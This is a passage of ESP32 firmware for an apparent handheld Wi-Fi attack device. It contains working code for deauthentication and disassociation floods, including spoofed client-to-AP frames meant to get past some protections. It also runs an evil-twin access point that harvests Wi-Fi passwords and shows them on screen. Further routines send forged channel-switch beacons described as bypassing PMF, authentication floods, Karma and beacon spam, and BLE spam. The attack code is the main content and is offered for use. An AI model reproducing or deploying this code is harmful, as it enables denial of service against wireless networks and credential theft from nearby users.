    // Calculate how many entries fit on screen (approx 28 lines on 320px at text size 1, minus header/footer)
    int maxVisible = 10; // each entry takes ~2 lines
    int startIdx = credsScrollOffset;
    if (startIdx > _credCount - 1) startIdx = _credCount - 1;
    if (startIdx < 0) startIdx = 0;

    tft.print("Showing ");
    tft.print(startIdx + 1);
    tft.print("-");
    tft.print(min(startIdx + maxVisible, _credCount));
    tft.print(" of ");
    tft.println(_credCount);
    tft.println();

    for (int i = startIdx; i < _credCount && i < startIdx + maxVisible; i++) {
      // SSID line
      if (_credLog[i].verified) {
        tft.setTextColor(TFT_GREEN, TFT_BLACK);
        tft.print("[OK] ");
      } else {
        tft.setTextColor(TFT_RED, TFT_BLACK);
        tft.print("[??] ");
      }
      tft.setTextColor(TFT_YELLOW, TFT_BLACK);
      tft.println(_credLog[i].ssid);

      // Password line
      tft.setTextColor(TFT_WHITE, TFT_BLACK);
      tft.print("  -> ");
      tft.setTextColor(TFT_CYAN, TFT_BLACK);
      tft.println(_credLog[i].password);
    }
  }

  // Footer bar
  tft.fillRect(0, tft.height() - 28, tft.width(), 28, TFT_NAVY);
  tft.setTextSize(1);
  tft.setTextColor(TFT_CYAN, TFT_NAVY);
  tft.setCursor(5, tft.height() - 26);
  tft.print("UP/DOWN: scroll");
  tft.setTextColor(TFT_WHITE, TFT_NAVY);
  tft.setCursor(5, tft.height() - 14);
  tft.print("5: Back to main");
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
}

// Handle button presses — UP/DOWN/DEAUTH/EVIL/CREDS
void handleButtons() {
  bool upState       = digitalRead(UP_BTN);
  bool downState     = digitalRead(DOWN_BTN);
  bool deauthState   = digitalRead(DEAUTH_BTN);
  bool evilTwinState = digitalRead(EVILTWIN_BTN);
  bool credsState    = digitalRead(CREDS_BTN);

  unsigned long now_ms = millis();

  int networkCount = 0;
  for (int i = 0; i < MAX_NETWORKS; i++) {
    if (_networks[i].ssid != "") networkCount++;
  }

  // Button 1: UP — navigate up in network list (or scroll creds)
  if (upState == LOW && lastUpState == HIGH &&
      (now_ms - lastDebounceUp) > debounceDelay) {
    lastDebounceUp = now_ms;

    if (showingCreds) {
      // Scroll credentials up
      if (credsScrollOffset > 0) credsScrollOffset--;
      displayCredentials();
    } else if (networkCount > 0) {
      currentTargetIndex--;
      if (currentTargetIndex < 0) currentTargetIndex = networkCount - 1;
      _selectedNetwork = _networks[currentTargetIndex];
      clearClients();
      Serial.print("Selected network: ");
      Serial.println(_selectedNetwork.ssid);
      updateDisplay();
    }
  }

  // Button 2: DOWN — navigate down in network list (or scroll creds)
  if (downState == LOW && lastDownState == HIGH &&
      (now_ms - lastDebounceDown) > debounceDelay) {
    lastDebounceDown = now_ms;

    if (showingCreds) {
      // Scroll credentials down
      if (credsScrollOffset < _credCount - 1) credsScrollOffset++;
      displayCredentials();
    } else if (networkCount > 0) {
      currentTargetIndex = (currentTargetIndex + 1) % networkCount;
      _selectedNetwork = _networks[currentTargetIndex];
      clearClients();
      Serial.print("Selected network: ");
      Serial.println(_selectedNetwork.ssid);
      updateDisplay();
    }
  }

  // Button 3: DEAUTH — toggle deauth attack (only if target selected)
  if (deauthState == LOW && lastDeauthState == HIGH &&
      (now_ms - lastDebounceDeauth) > debounceDelay) {
    lastDebounceDeauth = now_ms;
    if (!showingCreds && _selectedNetwork.ssid != "") {
      deauthing_active = !deauthing_active;
      deauthAllActive = false;
      if (deauthing_active && !hotspot_active) syncAPChannel();
      Serial.print("Deauth attack: ");
      Serial.println(deauthing_active ? "ON" : "OFF");
      updateDisplay();
    }
  }

  // Button 4: EVIL TWIN — toggle evil twin attack (only if target selected)
  if (evilTwinState == LOW && lastEvilTwinState == HIGH &&
      (now_ms - lastDebounceEvil) > debounceDelay) {
    lastDebounceEvil = now_ms;
    if (!showingCreds && (_selectedNetwork.ssid != "" || hotspot_active)) {
      hotspot_active = !hotspot_active;
      if (hotspot_active && _selectedNetwork.ssid != "") {
        deauthing_active = true;  // Auto-start deauth with evil twin
        _etGraceUntil = millis() + 5000;  // 5s grace for captive portal detection
        _lastStationCount = 0;
        switchAPConfig(_selectedNetwork.ssid.c_str(), NULL, _selectedNetwork.ch);
      } else if (!hotspot_active) {
        switchAPConfig("Artemisz", "Eviltwin", 1);
      }
      Serial.print("Evil Twin attack: ");
      Serial.println(hotspot_active ? "ON" : "OFF");
      updateDisplay();
    }
  }

  // Button 5: CREDS — toggle credential view
  if (credsState == LOW && lastCredsState == HIGH &&
      (now_ms - lastDebounceCreds) > debounceDelay) {
    lastDebounceCreds = now_ms;
    showingCreds = !showingCreds;
    if (showingCreds) {
      credsScrollOffset = 0;
      displayCredentials();
    } else {
      updateDisplay();
    }
  }

  lastUpState       = upState;
  lastDownState     = downState;
  lastDeauthState   = deauthState;
  lastEvilTwinState = evilTwinState;
  lastCredsState    = credsState;
}

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();

  // Evil Twin: detect new client connections → pause deauth for DNS/HTTP to work
  if (hotspot_active) {
    int stationCount = WiFi.softAPgetStationNum();
    if (stationCount > _lastStationCount) {
      _etGraceUntil = millis() + 5000;  // 5s full pause for captive portal detection
      Serial.printf("[ET] New client connected (%d total) — pausing deauth 5s\n", stationCount);
    }
    _lastStationCount = stationCount;
  }

  // Deauth pacing: full pause during grace/verification, slow when clients on fake AP
  bool graceActive = hotspot_active && millis() < _etGraceUntil;
  bool verifying = _awaitingVerification;
  bool clientsOnFakeAP = hotspot_active && WiFi.softAPgetStationNum() > 0;
  unsigned long deauthInterval = clientsOnFakeAP ? 2000 : (hotspot_active ? 80 : 100);
  if (deauthing_active && !deauthAllActive && !graceActive && !verifying && millis() - deauth_now >= deauthInterval) {
    // Ensure we're on the target channel
    esp_wifi_set_channel(_selectedNetwork.ch, WIFI_SECOND_CHAN_NONE);

    // 802.11 deauth frame template
    uint8_t deauthPacket[26] = {
      0xC0, 0x00,                                     // type: deauthentication
      0x00, 0x00,                                     // duration
      0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,             // DA (overwritten)
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00,             // SA (overwritten)
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00,             // BSSID
      0x00, 0x00,                                     // sequence (rotated)
      0x07, 0x00                                      // reason: Class 3 frame from nonassociated STA
    };
    memcpy(&deauthPacket[16], _selectedNetwork.bssid, 6); // BSSID = target AP
    const int BURST = 5;

    // Helper: set rotating sequence number and send deauth + disassoc burst
    static unsigned long _lastDeauthLog = 0;
    auto sendBurst = [&]() {
      for (int b = 0; b < BURST; b++) {
        _deauthSeqNum = (_deauthSeqNum + 1) & 0xFFF;
        uint16_t seqCtl = _deauthSeqNum << 4;
        deauthPacket[22] = seqCtl & 0xFF;
        deauthPacket[23] = (seqCtl >> 8) & 0xFF;
        deauthPacket[0] = 0xC0; // deauth
        esp_err_t r1 = esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, sizeof(deauthPacket), false);
        deauthPacket[0] = 0xA0; // disassoc
        esp_err_t r2 = esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, sizeof(deauthPacket), false);
        if (b == 0 && millis() - _lastDeauthLog >= 2000) {
          uint8_t ch = 0; wifi_second_chan_t sec;
          esp_wifi_get_channel(&ch, &sec);
          Serial.printf("[DEAUTH] ch=%d target_ch=%d clients=%d tx=%s/%s DA=%02X:%02X:%02X:%02X:%02X:%02X\n",
            ch, _selectedNetwork.ch, _clientCount,
            esp_err_to_name(r1), esp_err_to_name(r2),
            deauthPacket[4], deauthPacket[5], deauthPacket[6],
            deauthPacket[7], deauthPacket[8], deauthPacket[9]);
          _lastDeauthLog = millis();
        }
      }
    };

    // Targeted deauth to each known client — both directions for maximum effect
    if (_clientCount > 0) {
      for (int c = 0; c < _clientCount; c++) {
        // AP -> Client (AP kicks client)
        memcpy(&deauthPacket[4], _clientMACs[c], 6);          // DA = client
        memcpy(&deauthPacket[10], _selectedNetwork.bssid, 6); // SA = AP
        sendBurst();
        // Client -> AP (spoof client disconnecting — bypasses some AP protections)
        memcpy(&deauthPacket[4], _selectedNetwork.bssid, 6);  // DA = AP
        memcpy(&deauthPacket[10], _clientMACs[c], 6);         // SA = client
        sendBurst();
      }
    }

    // Broadcast fallback (catches clients sniffer missed)
    // Send with multiple reason codes for broader compatibility
    memcpy(&deauthPacket[4], broadcast, 6);
    memcpy(&deauthPacket[10], _selectedNetwork.bssid, 6);     // SA = AP
    sendBurst();
    // Also reason 6: Class 2 frame from nonauthenticated STA
    deauthPacket[24] = 0x06; deauthPacket[25] = 0x00;
    sendBurst();
    // Also reason 1: Unspecified
    deauthPacket[24] = 0x01; deauthPacket[25] = 0x00;
    sendBurst();
    deauthPacket[24] = 0x07; deauthPacket[25] = 0x00; // Restore default reason

    deauth_now = millis();
  }

  // Multi-target deauth — round-robin through all scanned networks
  if (deauthAllActive && !graceActive && !verifying && millis() - deauth_now >= 100) {
    int netCount = 0;
    for (int i = 0; i < MAX_NETWORKS; i++) { if (_networks[i].ssid != "") netCount++; else break; }
    if (netCount > 0) {
      if (_deauthRobinIdx >= netCount) _deauthRobinIdx = 0;
      if (!hotspot_active) esp_wifi_set_channel(_networks[_deauthRobinIdx].ch, WIFI_SECOND_CHAN_NONE);
      uint8_t daPkt[26] = {
        0xC0, 0x00, 0x00, 0x00,
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x07, 0x00
      };
      memcpy(&daPkt[16], _networks[_deauthRobinIdx].bssid, 6);
      memcpy(&daPkt[10], _networks[_deauthRobinIdx].bssid, 6);
      for (int b = 0; b < 3; b++) {
        _deauthSeqNum = (_deauthSeqNum + 1) & 0xFFF;
        uint16_t seqC = _deauthSeqNum << 4;
        daPkt[22] = seqC & 0xFF; daPkt[23] = (seqC >> 8) & 0xFF;
        daPkt[0] = 0xC0;
        esp_wifi_80211_tx(WIFI_IF_AP, daPkt, sizeof(daPkt), false);
        daPkt[0] = 0xA0;
        esp_wifi_80211_tx(WIFI_IF_AP, daPkt, sizeof(daPkt), false);
      }
      _deauthRobinIdx = (_deauthRobinIdx + 1) % netCount;
    }
    deauth_now = millis();
  }

  // CSA Attack — send forged beacon with Channel Switch Announcement IE
  // Bypasses PMF: beacons aren't individually integrity-protected
  if (csaAttackActive && !graceActive && !verifying && millis() - _csaTimer >= 50) {
    if (!hotspot_active) esp_wifi_set_channel(_selectedNetwork.ch, WIFI_SECOND_CHAN_NONE);
    sendCSABeacon();
    _csaTimer = millis();
  }

  // Auth Flood — exhaust AP's client association table
  if (authFloodActive && !graceActive && !verifying && millis() - _authFloodTimer >= 50) {
    if (!hotspot_active) esp_wifi_set_channel(_selectedNetwork.ch, WIFI_SECOND_CHAN_NONE);
    sendAuthFlood();
    _authFloodTimer = millis();
  }

  // Karma — send beacon frames for all probed SSIDs every 200ms
  if (karmaActive && _probeCount > 0 && millis() - _karmaBeaconTimer >= 200) {
    for (int i = 0; i < _probeCount; i++) {
      sendKarmaBeacon(_probes[i].ssid);
    }
    _karmaBeaconTimer = millis();
  }

  // Beacon Spam — flood 30 fake SSIDs every 100ms
  if (beaconSpamActive && millis() - _beaconSpamTimer >= 100) {
    for (int i = 0; i < BEACON_SPAM_COUNT; i++) {
      sendKarmaBeacon(_spamSSIDs[i]);
    }
    _beaconSpamTimer = millis();
  }

  // Random Beacon Spam — generate random SSIDs
  if (randomBeaconActive && millis() - _randomBeaconTimer >= 100) {
    for (int i = 0; i < 10; i++) sendRandomBeacon();
    _randomBeaconTimer = millis();
  }

  // AP Clone Spam — flood clones of selected AP
  if (apCloneSpamActive && millis() - _apCloneTimer >= 100) {
    sendAPCloneBeacon();
    _apCloneTimer = millis();
  }

  // Rick Roll Beacon — song lyrics as SSIDs
  if (rickRollActive && millis() - _rickRollTimer >= 100) {
    sendRickRollBeacons();
    _rickRollTimer = millis();
  }

  // Probe Request Flood
  if (probeFloodActive && millis() - _probeFloodTimer >= 50) {
    sendProbeFlood();
    _probeFloodTimer = millis();
  }

  // BLE Spam (Sour Apple / Swiftpair / Samsung)
  if (bleSpamActive && millis() - _bleSpamTimer >= 100) {
    sendBLESpam();
    _bleSpamTimer = millis();
  }

  // Deauth detection serial alert
  if (deauthDetectActive && millis() - _lastDeauthAlert >= 3000 && _deauthDetected > 0) {
    Serial.printf("[!] DEAUTH DETECTED: %u frames (RSSI: %d dBm)\n", _deauthDetected, _deauthLastRSSI);
    _deauthDetected = 0;
    _lastDeauthAlert = millis();
  }

  // Signal Monitor — update RSSI graph
  if (signalMonitorActive && millis() - _sigMonTimer >= 200) {
    if (_selectedNetwork.ssid.length() > 0) {
      if (!hotspot_active) esp_wifi_set_channel(_selectedNetwork.ch, WIFI_SECOND_CHAN_NONE);
      _rssiHistory[_rssiHistIdx] = _lastTargetRSSI;
      _rssiHistIdx = (_rssiHistIdx + 1) % SIG_MON_WIDTH;
      drawSignalMonitor();
    }
    _sigMonTimer = millis();
  }

  // Channel hopping — cycle 1-13 while Karma sniffing for broad probe capture
  if (karmaActive && !hotspot_active && !deauthing_active && !deauthAllActive &&
      !signalMonitorActive &&
      millis() - _channelHopTimer >= 300) {
    _hopChannel = (_hopChannel % 13) + 1;
    esp_wifi_set_channel(_hopChannel, WIFI_SECOND_CHAN_NONE);
    _channelHopTimer = millis();
  }

  // Skip scanning when evil twin or deauth is active
  if (!hotspot_active && !deauthing_active && !deauthAllActive &&
      !signalMonitorActive && millis() - now >= 15000) {
    performScan();
    if (!showingCreds) updateDisplay();
    now = millis();
  }

  // Refresh display every 5 seconds to reduce flicker (full redraw causes blink)
  if (millis() - display_refresh >= 5000) {
    if (!showingCreds && !signalMonitorActive) updateDisplay();
    display_refresh = millis();
  }

  // Serial CLI
  handleSerialCLI();

  // Check button states
  handleButtons();
}
